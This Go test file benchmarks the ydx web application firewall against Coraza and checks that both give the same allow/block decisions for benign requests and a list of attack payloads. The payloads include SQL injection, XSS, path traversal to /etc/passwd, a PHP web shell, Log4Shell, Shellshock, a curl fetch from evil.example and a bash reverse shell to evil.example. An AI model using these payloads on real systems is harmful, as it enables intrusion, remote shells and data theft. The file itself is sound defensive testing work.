package waf

import (
	"bytes"
	"embed"
	"io"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"runtime"
	"strings"
	"testing"

	"github.com/corazawaf/coraza/v3"
	"github.com/corazawaf/coraza/v3/experimental"
	corazahttp "github.com/corazawaf/coraza/v3/http"
	"github.com/shibingli/ydx/log"
	ydxwaf "github.com/shibingli/ydx/waf"
)

// builtinFS holds the self-contained rule set used when YDX_WAF_CRS_DIR is unset. |
// builtinFS 保存未设置 YDX_WAF_CRS_DIR 时使用的自包含规则集。
//
//go:embed testdata/rules.conf
var builtinFS embed.FS

const crsEnv = "YDX_WAF_CRS_DIR"

// ruleSetup describes one comparable rule source for both engines. | ruleSetup 描述两个引擎共用的
// 可比较规则源。
type ruleSetup struct {
	name             string
	fsys             fs.FS
	ruleFiles        []string
	corazaDirectives string
	ydxDirectives    []string
}

// setupFor selects the embedded rules by default and OWASP CRS when YDX_WAF_CRS_DIR is set. |
// setupFor 默认选择内嵌规则，设置 YDX_WAF_CRS_DIR 时选择 OWASP CRS。
func setupFor(tb testing.TB) ruleSetup {
	tb.Helper()
	if dir := os.Getenv(crsEnv); dir != "" {
		info, err := os.Stat(dir)
		if err != nil || !info.IsDir() {
			tb.Fatalf("%s=%q is not a directory: %v", crsEnv, dir, err)
		}
		return ruleSetup{
			name:      "crs",
			fsys:      os.DirFS(dir),
			ruleFiles: []string{"crs-setup.conf", "rules/*.conf"},
			corazaDirectives: "Include crs-setup.conf\n" +
				"Include rules/*.conf\nSecRuleEngine On\nSecRequestBodyAccess On",
			ydxDirectives: []string{"SecRuleEngine On", "SecRequestBodyAccess On"},
		}
	}
	return ruleSetup{
		name:             "embedded",
		fsys:             builtinFS,
		ruleFiles:        []string{"testdata/rules.conf"},
		corazaDirectives: "Include testdata/*.conf\nSecRuleEngine On\nSecRequestBodyAccess On",
		ydxDirectives:    []string{"SecRuleEngine On", "SecRequestBodyAccess On"},
	}
}

func buildYDX(tb testing.TB, setup ruleSetup) *ydxwaf.WAF {
	tb.Helper()
	engine, err := ydxwaf.New(ydxwaf.Options{
		RootFS:     setup.fsys,
		RuleFiles:  setup.ruleFiles,
		Directives: setup.ydxDirectives,
		Logger:     log.New(log.Options{Writer: io.Discard}),
	})
	if err != nil {
		tb.Fatalf("ydx waf.New: %v", err)
	}
	return engine
}

func newYDX(tb testing.TB, setup ruleSetup) *ydxwaf.WAF {
	engine := buildYDX(tb, setup)
	tb.Cleanup(func() { _ = engine.Close() })
	return engine
}

func buildCoraza(tb testing.TB, setup ruleSetup) coraza.WAF {
	tb.Helper()
	w, err := coraza.NewWAF(coraza.NewWAFConfig().
		WithRootFS(setup.fsys).
		WithDirectives(setup.corazaDirectives))
	if err != nil {
		tb.Fatalf("coraza.NewWAF: %v", err)
	}
	return w
}

func newCoraza(tb testing.TB, setup ruleSetup) coraza.WAF {
	w := buildCoraza(tb, setup)
	if closer, ok := w.(experimental.WAFCloser); ok {
		tb.Cleanup(func() { _ = closer.Close() })
	}
	return w
}

func ydxHandler(tb testing.TB, setup ruleSetup) http.Handler {
	return newYDX(tb, setup).HTTPMiddleware(okHandler())
}

func ydxSequentialHandler(tb testing.TB, setup ruleSetup) http.Handler {
	tb.Helper()
	engine, err := ydxwaf.New(ydxwaf.Options{
		RootFS:          setup.fsys,
		RuleFiles:       setup.ruleFiles,
		Directives:      setup.ydxDirectives,
		ParallelWorkers: 1,
		Logger:          log.New(log.Options{Writer: io.Discard}),
	})
	if err != nil {
		tb.Fatalf("ydx waf.New: %v", err)
	}
	tb.Cleanup(func() { _ = engine.Close() })
	return engine.HTTPMiddleware(okHandler())
}

func corazaHandler(tb testing.TB, setup ruleSetup) http.Handler {
	return corazahttp.WrapHandler(newCoraza(tb, setup), okHandler())
}

func okHandler() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte("ok"))
	})
}

func newRequest(method, target, body, ctype string) *http.Request {
	var r *http.Request
	if body == "" {
		r = httptest.NewRequest(method, target, nil)
	} else {
		r = httptest.NewRequest(method, target, strings.NewReader(body))
		r.Header.Set("Content-Type", ctype)
	}
	return r
}

type payload struct {
	name    string
	method  string
	target  string
	body    string
	ctype   string
	headers map[string]string
}

func newPayloadRequest(p payload) *http.Request {
	r := newRequest(p.method, p.target, p.body, p.ctype)
	for k, v := range p.headers {
		r.Header.Set(k, v)
	}
	return r
}

func status(h http.Handler, p payload) int {
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, newPayloadRequest(p))
	return rec.Code
}

func get(name, query string, tags ...string) payload {
	p := payload{name: name, method: http.MethodGet, target: "/?" + query}
	for _, tag := range tags {
		switch tag {
		case "sqlmap":
			p.headers = map[string]string{"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"}
		case "nikto":
			p.headers = map[string]string{"User-Agent": "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)"}
		case "shellshock":
			p.headers = map[string]string{"User-Agent": "() { :; }; /bin/bash -c 'id'"}
		}
	}
	return p
}

func form(name, values string) payload {
	return payload{
		name:   name,
		method: http.MethodPost,
		target: "/api/items",
		body:   values,
		ctype:  "application/x-www-form-urlencoded",
	}
}

func esc(s string) string { return url.QueryEscape(s) }

// payloads returns the shared comparison set: benign traffic plus SQLi, XSS, LFI, RCE, PHP,
// protocol and scanner payloads. | payloads 返回共享对比集：善意流量，以及 SQLi、XSS、LFI、RCE、
// PHP、协议与扫描器载荷。
func payloads() []payload {
	return []payload{
		get("benign", "q=hello&name=world&id=42"),
		get("benign-search", "q=hello+world&page=2"),
		get("benign-path", "path=/api/v1/items/42"),
		get("benign-json-like", "filter=%7B%22name%22%3A%22hello%22%7D"),
		get("benign-long", "q="+esc(strings.Repeat("harmless-value-", 20))),
		form("benign-form", "name=hello&comment=hello+world&id=42"),
		{name: "benign-json", method: http.MethodPost, target: "/api/items", body: `{"name":"hello","id":42}`, ctype: "application/json"},
		{name: "benign-multipart", method: http.MethodPost, target: "/upload", ctype: "multipart/form-data; boundary=abc", body: "--abc\r\nContent-Disposition: form-data; name=\"note\"\r\n\r\nhello\r\n--abc--\r\n"},
		get("benign-ua", "q=hello"),

		get("sqli-or", "q="+esc("1' OR '1'='1")),
		get("sqli-union", "q="+esc("1 UNION SELECT username,password FROM users")),
		get("sqli-union-all", "q="+esc("1 UNION ALL SELECT NULL,NULL,NULL")),
		get("sqli-drop", "q="+esc("1;DROP TABLE users")),
		get("sqli-sleep", "q="+esc("1 AND SLEEP(5)")),
		get("sqli-benchmark", "q="+esc("1 AND BENCHMARK(1000000,MD5(1))")),
		get("sqli-comment", "q="+esc("admin'--")),
		get("sqli-quote", "q="+esc("' or 1=1#")),
		get("sqli-info-schema", "q="+esc("1 AND 1=2 UNION SELECT table_name FROM information_schema.tables")),
		get("sqli-outfile", "q="+esc("1 INTO OUTFILE '/tmp/x'")),
		form("sqli-form", "q="+esc("1' OR '1'='1")),
		form("sqli-form-union", "q="+esc("1 UNION SELECT username,password FROM users")),
		form("sqli-form-hex", "q="+esc("0x31 OR 0x31=0x31")),

		get("xss-script", "q="+esc("<script>alert(1)</script>")),
		get("xss-img", "q="+esc("<img src=x onerror=alert(1)>")),
		get("xss-svg", "q="+esc(`"><svg/onload=alert(1)>`)),
		get("xss-js", "q="+esc("javascript:alert(1)")),
		get("xss-iframe", "q="+esc("<iframe src=javascript:alert(1)>")),
		get("xss-body", "q="+esc("<body onload=alert(1)>")),
		get("xss-encoded", "q=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B"),
		form("xss-form", "comment="+esc("<script>alert(1)</script>")),
		form("xss-form-img", "comment="+esc("<img src=x onerror=alert(1)>")),

		get("lfi-passwd", "q="+esc("../../etc/passwd")),
		get("lfi-passwd-encoded", "q=..%2f..%2fetc%2fpasswd"),
		get("lfi-passwd-double", "q=..%252f..%252fetc%252fpasswd"),
		get("lfi-php-filter", "q="+esc("php://filter/convert.base64-encode/resource=index.php")),
		get("lfi-null", "q=..%00etc/passwd"),
		get("lfi-windows", "q="+esc(`..\..\windows\system32\config\sam`)),
		get("lfi-var-log", "q="+esc("/var/log/auth.log")),

		get("rce-cat", "q="+esc(";cat /etc/passwd")),
		get("rce-whoami", "q="+esc("|whoami")),
		get("rce-subshell", "q="+esc("$(id)")),
		get("rce-backtick", "q="+esc("`id`")),
		get("rce-curl", "q="+esc(";curl http://evil.example/shell.sh")),
		get("rce-bash", "q="+esc("bash -i >& /dev/tcp/evil.example/4444 0>&1")),
		get("rce-powershell", "q="+esc("powershell -EncodedCommand ZQBjAGgAbwA=")),
		get("rce-shellshock", "q=hello", "shellshock"),

		get("php-inject", "q="+esc(`<?php system($_GET['cmd']); ?>`)),
		get("phpinfo", "q="+esc("phpinfo()")),
		get("php-eval", "q="+esc("eval(base64_decode('ZWNobyAxOw=='))")),

		get("crlf", "q=%0d%0aSet-Cookie%3A%20pwned%3D1"),
		get("rfi-http", "q="+esc("http://evil.example/shell.txt")),
		get("rfi-ftp", "q="+esc("ftp://evil.example/x")),
		get("log4shell", "q="+esc("${jndi:ldap://evil.example/a}")),
		get("java-classloader", "q="+esc("class.module.classLoader")),
		get("session-fixation", "sessionid=attacker"),
		get("ssti", "q="+esc("{{7*7}}")),
		get("xxe", "q="+esc("<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>")),
		get("scanner-sqlmap", "q=hello", "sqlmap"),
		get("scanner-nikto", "q=hello", "nikto"),
	}
}

// windowsCorazaPathMiss lists CRS payloads Coraza misses on Windows because its normalizePath and
// normalizePathWin transforms call filepath.Clean, which turns '/' into '\' on that platform. |
// windowsCorazaPathMiss 列出 Coraza 在 Windows 上因 normalizePath/normalizePathWin 调用
// filepath.Clean 把 '/' 变成 '\' 而漏报的 CRS 载荷。
var windowsCorazaPathMiss = map[string]bool{
	"lfi-var-log": true,
	"rce-cat":     true,
	"rce-bash":    true,
}

// TestLoad verifies that both engines accept the selected rule set. | TestLoad 验证两个引擎都能加载
// 所选规则集。
func TestLoad(t *testing.T) {
	setup := setupFor(t)
	ydx := newYDX(t, setup)
	if ydx.RulesCount() == 0 {
		t.Fatal("ydx loaded no rules")
	}
	t.Logf("%s: ydx rules=%d", setup.name, ydx.RulesCount())
	corazaWAF := newCoraza(t, setup)
	if rc, ok := corazaWAF.(experimental.WAFWithRules); ok {
		if rc.RulesCount() == 0 {
			t.Fatal("coraza loaded no rules")
		}
		t.Logf("%s: coraza rules=%d", setup.name, rc.RulesCount())
	}
}

// TestDetectionParity compares the final allow/block decision for the shared payload set. The
// embedded rules are platform-independent and must agree exactly. Full CRS mode allows the known
// Coraza Windows path-transform misses and requires ydx to block them. | TestDetectionParity 对比
// 共享载荷集的最终放行/拦截决定。内嵌规则与平台无关，必须完全一致。完整 CRS 模式允许 Coraza 在
// Windows 上已知的路径变换漏报，但要求 ydx 拦截。
func TestDetectionParity(t *testing.T) {
	setup := setupFor(t)
	ydx := ydxHandler(t, setup)
	corazaH := corazaHandler(t, setup)
	var allowed, blocked, mismatch int
	for _, p := range payloads() {
		gotYdx := status(ydx, p)
		gotCoraza := status(corazaH, p)
		if gotYdx == gotCoraza {
			if gotYdx == http.StatusForbidden {
				blocked++
			} else {
				allowed++
			}
			continue
		}
		if setup.name == "crs" && runtime.GOOS == "windows" &&
			windowsCorazaPathMiss[p.name] && gotYdx == http.StatusForbidden && gotCoraza == http.StatusOK {
			t.Logf("known Coraza Windows normalizePath miss: %-18s ydx=%d coraza=%d",
				p.name, gotYdx, gotCoraza)
			blocked++
			continue
		}
		mismatch++
		t.Errorf("mismatch %-18s ydx=%d coraza=%d", p.name, gotYdx, gotCoraza)
	}
	t.Logf("%s: agreement=%d/%d blocked=%d allowed=%d mismatch=%d",
		setup.name, len(payloads())-mismatch, len(payloads()), blocked, allowed, mismatch)
}

type discardWriter struct {
	header http.Header
}

func (w *discardWriter) Header() http.Header {
	if w.header == nil {
		w.header = make(http.Header)
	}
	return w.header
}

func (w *discardWriter) Write(p []byte) (int, error) { return len(p), nil }
func (w *discardWriter) WriteHeader(int)             {}

func benchHTTP(b *testing.B, h http.Handler, p payload) {
	req := newPayloadRequest(p)
	w := &discardWriter{}
	body := []byte(p.body)
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if len(body) > 0 {
			req.Body = io.NopCloser(bytes.NewReader(body))
		}
		h.ServeHTTP(w, req)
	}
}

func benchParallel(b *testing.B, h http.Handler, p payload) {
	b.ReportAllocs()
	b.ResetTimer()
	b.RunParallel(func(pb *testing.PB) {
		req := newPayloadRequest(p)
		w := &discardWriter{}
		body := []byte(p.body)
		for pb.Next() {
			if len(body) > 0 {
				req.Body = io.NopCloser(bytes.NewReader(body))
			}
			h.ServeHTTP(w, req)
		}
	})
}

func BenchmarkBenignGET(b *testing.B) {
	setup := setupFor(b)
	p := get("benign", "q=hello&name=world&id=42")
	b.Run("ydx", func(b *testing.B) { benchHTTP(b, ydxHandler(b, setup), p) })
	b.Run("coraza", func(b *testing.B) { benchHTTP(b, corazaHandler(b, setup), p) })
}

func BenchmarkAttackGET(b *testing.B) {
	setup := setupFor(b)
	p := get("sqli", "q="+esc("1' OR '1'='1"))
	b.Run("ydx", func(b *testing.B) { benchHTTP(b, ydxHandler(b, setup), p) })
	b.Run("coraza", func(b *testing.B) { benchHTTP(b, corazaHandler(b, setup), p) })
}

func BenchmarkBenignPOST(b *testing.B) {
	setup := setupFor(b)
	p := form("benign-form", "name=hello&comment=hello+world&id=42")
	b.Run("ydx", func(b *testing.B) { benchHTTP(b, ydxHandler(b, setup), p) })
	b.Run("coraza", func(b *testing.B) { benchHTTP(b, corazaHandler(b, setup), p) })
}

func BenchmarkAttackPOST(b *testing.B) {
	setup := setupFor(b)
	p := form("sqli-form", "q="+esc("1' OR '1'='1"))
	b.Run("ydx", func(b *testing.B) { benchHTTP(b, ydxHandler(b, setup), p) })
	b.Run("coraza", func(b *testing.B) { benchHTTP(b, corazaHandler(b, setup), p) })
}

func BenchmarkParallelBenignGET(b *testing.B) {
	setup := setupFor(b)
	p := get("benign", "q=hello&name=world&id=42")
	b.Run("ydx", func(b *testing.B) { benchParallel(b, ydxHandler(b, setup), p) })
	b.Run("coraza", func(b *testing.B) { benchParallel(b, corazaHandler(b, setup), p) })
}

func BenchmarkSequentialBenignGET(b *testing.B) {
	setup := setupFor(b)
	p := get("benign", "q=hello&name=world&id=42")
	b.Run("ydx", func(b *testing.B) { benchHTTP(b, ydxSequentialHandler(b, setup), p) })
	b.Run("coraza", func(b *testing.B) { benchHTTP(b, corazaHandler(b, setup), p) })
}

func BenchmarkBuild(b *testing.B) {
	setup := setupFor(b)
	b.Run("ydx", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			e := buildYDX(b, setup)
			_ = e.Close()
		}
	})
	b.Run("coraza", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			w := buildCoraza(b, setup)
			if c, ok := w.(experimental.WAFCloser); ok {
				_ = c.Close()
			}
		}
	})
}
